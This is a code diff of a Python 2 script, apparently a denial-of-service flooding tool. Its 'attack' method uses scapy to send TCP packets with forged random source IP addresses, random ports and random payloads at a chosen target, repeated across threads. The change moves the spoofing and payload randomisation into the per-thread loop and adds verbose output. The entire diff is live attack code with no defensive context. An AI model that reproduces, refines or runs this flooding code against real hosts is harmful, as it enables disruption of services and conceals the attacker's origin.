@@ -27,7 +27,7 @@ except ImportError as e:
 	print e
 
 
-class Flood:
+class Flood():
 
 	def cls(self):
 	    os.system('cls' if os.name == 'nt' else 'clear')
@@ -56,31 +56,42 @@ class Flood:
 	def attack(self, args, dstUrl, dstIp, dstPort, multiplier, threads, payloadLen, elapsedTime):
 		#attack loop
 		while 1:
+			srcIp=''
+			srcPort=''
 
-			#set random source ip
-			srcIp = '.'.join('%s'%random.randint(0, 255) for i in range(4))
-
-			#set random source port
-			srcPort = ''.join('%s'%random.randint(1,65535))
 
 			#randomize payload length under provided threshold between 1 to payloadlength
 			l=1
 			e=int(payloadLen)
-			randPayloadLen = random.randint(l,e)
+
 
 			#tell user what's happening
 			if args.verbose is True:print '[!] Attacking %s on port %s from %s using source port %s' % (dstIp, dstPort, srcIp, srcPort)
 
-			#randomize payload chars given the randomized length
-			payload = ''.join(random.choice('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM') for r in range(int(randPayloadLen)))
+
 
 			#threaded jobs list
 			jobs = []
 
+			#thread the loop instead of just the send?
 			for i in range(0,threads):
+	
+				#set random source ip
+				srcIp = '.'.join('%s'%random.randint(0, 255) for i in range(4))
 
+				#set random source port
+				srcPort = ''.join('%s'%random.randint(1,65535))
+
+				#randomize payload length
+
+				randPayloadLen = random.randint(l,e)
+
+				#randomize payload chars given the randomized length
+				payload = ''.join(random.choice('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM') for r in range(int(randPayloadLen)))
 				thread = threading.Thread(target=send(IP(src=srcIp, dst=dstIp) / TCP(sport=int(srcPort), dport=int(dstPort)) / payload, count=int(multiplier), verbose=args.verbose))
-				if args.verbose is True: print 'sending packet with %s %s %s %s %s'%(srcIp,dstIp,srcPort,dstPort,payload)
+				print thread
+
+				if args.verbose is True: print 'sending packet as %s:%s to %s:%s with payload %s'%(srcIp,srcPort,dstIp,dstPort,payload)
 				jobs.append(thread)
 				
 			for j in jobs:
